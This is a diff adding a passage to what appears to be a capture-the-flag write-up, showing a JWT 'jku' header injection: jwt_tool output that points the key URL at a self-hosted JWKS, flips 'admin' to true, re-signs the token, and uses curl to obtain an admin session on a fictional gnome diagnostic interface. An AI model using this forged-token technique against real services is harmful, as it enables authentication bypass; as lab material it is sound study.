@@ -175,3 +175,234 @@ nbf = NotBefore
 ```
 
 
+
+<img width="1258" height="794" alt="image" src="https://github.com/user-attachments/assets/51709adc-f0c9-4028-9906-871710214daa" />
+
+
+1. analyse existing token
+
+2. edit the token and sign it using rsa256
+
+3. generate a jwks.json file using https://www.authgear.com/tools/jwk-generator
+
+4. use the newly generated token to get a new session cookie
+
+   ```
+   paul@paulweb:~$ jwt_tool.py -T $TOKEN -S rs256
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.3.0                \______|             @ticarpi      
+
+/home/paul/.jwt_tool/jwtconf.ini
+Original JWT: 
+
+
+====================================================================
+This option allows you to tamper with the header, contents and 
+signature of the JWT.
+====================================================================
+
+Token header values:
+[1] alg = "RS256"
+[2] jku = "http://idp.atnascorp/.well-known/jwks.json"
+[3] kid = "idp-key-2025"
+[4] typ = "JWT"
+[5] *ADD A VALUE*
+[6] *DELETE A VALUE*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 2
+
+Current value of jku is: http://idp.atnascorp/.well-known/jwks.json
+Please enter new value and hit ENTER
+> http://paulweb.neighborhood/custom-jwks.json
+[1] alg = "RS256"
+[2] jku = "http://paulweb.neighborhood/custom-jwks.json"
+[3] kid = "idp-key-2025"
+[4] typ = "JWT"
+[5] *ADD A VALUE*
+[6] *DELETE A VALUE*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+
+Token payload values:
+[1] sub = "gnome"
+[2] iat = 1763558897    ==> TIMESTAMP = 2025-11-19 13:28:17 (UTC)
+[3] exp = 1763566097    ==> TIMESTAMP = 2025-11-19 15:28:17 (UTC)
+[4] iss = "http://idp.atnascorp/"
+[5] admin = False
+[6] *ADD A VALUE*
+[7] *DELETE A VALUE*
+[8] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 5
+
+Current value of admin is: False
+Please enter new value and hit ENTER
+> True
+[1] sub = "gnome"
+[2] iat = 1763558897    ==> TIMESTAMP = 2025-11-19 13:28:17 (UTC)
+[3] exp = 1763566097    ==> TIMESTAMP = 2025-11-19 15:28:17 (UTC)
+[4] iss = "http://idp.atnascorp/"
+[5] admin = True
+[6] *ADD A VALUE*
+[7] *DELETE A VALUE*
+[8] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+jwttool_3d3a37d3cb702277e6dded5f4b7989b2 - Tampered token - RSA Signing:
+[+] eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9jdXN0b20tandrcy5qc29uIiwia2lkIjoiaWRwLWtleS0yMDI1IiwidHlwIjoiSldUIn0.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1ODg5NywiZXhwIjoxNzYzNTY2MDk3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.ldbZLQJQa6dJ0hZv86NiCYoq40RqlK0BBUQzZBglu-Pfd1NnzIGZZnDzz1j-viUYWjsb9pNyaWzOAVYHtRkgQfJSjLEIwAAGfhoaQVJ3_omhpOZGZFFFCoT9JPUug6tL9Br9es974WO9IsqAoQYI1XY3QFLMTys8gFUUSDNLbxtdshmhs1WqonxOrcc5ADGh9RwuqmDfgTeIXQPVggsEQ14LXBDMtYcgQEdn9_fnq8uWpHl8lmLk6UQJY_hiwZsTIqFlX-SJmOo6bWl7eiWt-rXWk9fpSZgf8QKW-RF_OLJmdfean0kshyP7e20tTdK3I-SwsfEx8P6_6ktQyT-xZQ
+paul@paulweb:~$ NEWTOKEN=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9jdXN0b20tandrcy5qc29uIiwia2lkIjoiaWRwLWtleS0yMDI1IiwidHlwIjoiSldUIn0.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1ODg5NywiZXhwIjoxNzYzNTY2MDk3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.ldbZLQJQa6dJ0hZv86NiCYoq40RqlK0BBUQzZBglu-Pfd1NnzIGZZnDzz1j-viUYWjsb9pNyaWzOAVYHtRkgQfJSjLEIwAAGfhoaQVJ3_omhpOZGZFFFCoT9JPUug6tL9Br9es974WO9IsqAoQYI1XY3QFLMTys8gFUUSDNLbxtdshmhs1WqonxOrcc5ADGh9RwuqmDfgTeIXQPVggsEQ14LXBDMtYcgQEdn9_fnq8uWpHl8lmLk6UQJY_hiwZsTIqFlX-SJmOo6bWl7eiWt-rXWk9fpSZgf8QKW-RF_OLJmdfean0kshyP7e20tTdK3I-SwsfEx8P6_6ktQyT-xZQ
+paul@paulweb:~$ jwt_tool.py $NEWTOKEN -V -jw www/custom-jwks.json 
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.3.0                \______|             @ticarpi      
+
+/home/paul/.jwt_tool/jwtconf.ini
+Original JWT: 
+
+JWKS Contents:
+Number of keys: 1
+
+--------
+Key 1
+kid: idp-key-2025
+[+] kty = RSA
+[+] kid = idp-key-2025
+[+] use = sig
+[+] e = AQAB
+[+] n = tchOVdXUg9T_HV2f9TVZeoH3G2uB243yAa6Hh7RsyeOy1tAs-OEnD1_5TWrljY-RqoSfoEjbE38rtVLp_weDfroHn8I-I9lGuAA-wDI70sOTm4tSSDuwD9VBFmXI-dFwsTN446yRJagaZP4ZgfPoreOL9bpfL_7HxPOJZ14z2ZJZaP-7hr1HSasyTkkRG3u4pylgoRUu2ZUxWhqNg1A7e1YNUrtlqagooFxGYkZBXbBXJbHdMLn-PSs3tc3pWQEQHPAYBSFHnCzyTEOFQOixh-OQq3KyL5sHKvOWUhTyO2USOmJHLYUbCEd6_DfrcR4P5EctwTlTEU1ssXONGgxHAQ
+
+Found RSA key factors, generating a public key
+[+] kid_idp-key-2025_1763562509.pem
+
+Attempting to verify token using kid_idp-key-2025_1763562509.pem
+RSA Signature is VALID
+paul@paulweb:~$ curl -v http://gnome-48371.atnascorp/auth?token=$NEWTOKEN
+* Host gnome-48371.atnascorp:80 was resolved.
+* IPv6: (none)
+* IPv4: 127.0.0.1
+*   Trying 127.0.0.1:80...
+* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
+> GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9jdXN0b20tandrcy5qc29uIiwia2lkIjoiaWRwLWtleS0yMDI1IiwidHlwIjoiSldUIn0.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1ODg5NywiZXhwIjoxNzYzNTY2MDk3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.ldbZLQJQa6dJ0hZv86NiCYoq40RqlK0BBUQzZBglu-Pfd1NnzIGZZnDzz1j-viUYWjsb9pNyaWzOAVYHtRkgQfJSjLEIwAAGfhoaQVJ3_omhpOZGZFFFCoT9JPUug6tL9Br9es974WO9IsqAoQYI1XY3QFLMTys8gFUUSDNLbxtdshmhs1WqonxOrcc5ADGh9RwuqmDfgTeIXQPVggsEQ14LXBDMtYcgQEdn9_fnq8uWpHl8lmLk6UQJY_hiwZsTIqFlX-SJmOo6bWl7eiWt-rXWk9fpSZgf8QKW-RF_OLJmdfean0kshyP7e20tTdK3I-SwsfEx8P6_6ktQyT-xZQ HTTP/1.1
+> Host: gnome-48371.atnascorp
+> User-Agent: curl/8.5.0
+> Accept: */*
+> 
+< HTTP/1.1 302 FOUND
+< Date: Wed, 19 Nov 2025 14:28:41 GMT
+< Server: Werkzeug/3.0.1 Python/3.12.3
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 229
+< Location: /diagnostic-interface
+< Vary: Cookie
+< Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aR3UGQ.IKBsh1vLJH9lJHUEjPBwCpAz-B4; HttpOnly; Path=/
+< 
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
+* Connection #0 to host gnome-48371.atnascorp left intact
+```
+
+
+
+paul@paulweb:~$ curl -v http://gnome-48371.atnascorp/auth?token=$NEWTOKEN
+* Host gnome-48371.atnascorp:80 was resolved.
+* IPv6: (none)
+* IPv4: 127.0.0.1
+*   Trying 127.0.0.1:80...
+* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
+> GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9jdXN0b20tandrcy5qc29uIiwia2lkIjoiaWRwLWtleS0yMDI1IiwidHlwIjoiSldUIn0.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1ODg5NywiZXhwIjoxNzYzNTY2MDk3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.ldbZLQJQa6dJ0hZv86NiCYoq40RqlK0BBUQzZBglu-Pfd1NnzIGZZnDzz1j-viUYWjsb9pNyaWzOAVYHtRkgQfJSjLEIwAAGfhoaQVJ3_omhpOZGZFFFCoT9JPUug6tL9Br9es974WO9IsqAoQYI1XY3QFLMTys8gFUUSDNLbxtdshmhs1WqonxOrcc5ADGh9RwuqmDfgTeIXQPVggsEQ14LXBDMtYcgQEdn9_fnq8uWpHl8lmLk6UQJY_hiwZsTIqFlX-SJmOo6bWl7eiWt-rXWk9fpSZgf8QKW-RF_OLJmdfean0kshyP7e20tTdK3I-SwsfEx8P6_6ktQyT-xZQ HTTP/1.1
+> Host: gnome-48371.atnascorp
+> User-Agent: curl/8.5.0
+> Accept: */*
+> 
+< HTTP/1.1 302 FOUND
+< Date: Wed, 19 Nov 2025 14:37:54 GMT
+< Server: Werkzeug/3.0.1 Python/3.12.3
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 229
+< Location: /diagnostic-interface
+< Vary: Cookie
+< Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aR3WQg.4rlv-ZRlOiX5bZMJscURH-lfjww; HttpOnly; Path=/
+< 
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
+* Connection #0 to host gnome-48371.atnascorp left intact
+```
+
+```
+paul@paulweb:~$ curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aR3WQg.4rlv-ZRlOiX5bZMJscURH-lfjww' http://gnome-48371.atnascorp/diagnostic-interface
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>AtnasCorp : Gnome Diagnostic Interface</title>
+    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
+</head>
+<body>
+<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
+<div style='display:flex; justify-content:center; gap:10px;'>
+<img src='/camera-feed' style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0;' />
+<div style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0; display:flex; align-items:flex-start; justify-content:flex-start; text-align:left;'>
+System Log<br/>
+2025-11-19 04:53:07: Movement detected.<br/>
+2025-11-19 13:21:18: AtnasCorp C&C connection restored.<br/>
+2025-11-19 14:31:53: Checking for updates.<br/>
+2025-11-19 14:31:53: Firmware Update available: refrigeration-botnet.bin<br/>
+2025-11-19 14:31:55: Firmware update downloaded.<br/>
+2025-11-19 14:31:55: Gnome will reboot to apply firmware update in one hour.</div>
+</div>
+<div class="statuscheck">
+    <div class="status-container">
+        <div class="status-item">
+            <div class="status-indicator active"></div>
+            <span>Live Camera Feed</span>
+        </div>
+        <div class="status-item">
+            <div class="status-indicator active"></div>
+            <span>Network Connection</span>
+        </div>
+        <div class="status-item">
+            <div class="status-indicator active"></div>
+            <span>Connectivity to Atnas C&C</span>
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
+```
+
+<img width="847" height="448" alt="image" src="https://github.com/user-attachments/assets/df832d1a-6864-4f2b-9fb8-dd0337c8d252" />
+
